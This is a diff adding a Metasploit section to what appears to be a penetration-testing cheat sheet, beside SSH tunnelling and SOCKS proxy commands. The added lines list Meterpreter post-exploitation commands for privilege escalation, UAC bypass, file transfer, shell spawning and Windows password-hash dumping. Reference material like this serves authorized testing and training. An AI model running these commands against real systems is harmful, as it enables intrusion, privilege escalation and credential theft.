@@ -322,3 +322,20 @@ ssh -R 12340:localhost:9999 user@192.168.0.100
 
 ssh -C2qTnN -D 12001 user@target.host
 ````
+# Using Metasploit
+#### I highly recommend getting comfortable with metasploit, and meterpreter just incase you find Remote Code Execution, and spawn a shell.
+![image](https://user-images.githubusercontent.com/80599694/147913813-b8f42c43-3377-420f-ad8a-7524f50192ed.png)
+
+### Use Meterpreter Commands (reverse shell)
+````bash
+background
+sessions -l
+sessions -i 1
+sysinfo, ifconfig, route, getuid
+getsystem (privesc)
+bypassuac
+download x /root/
+upload x C:\\Windows
+shell
+use post/windows/gather/hashdump
+````
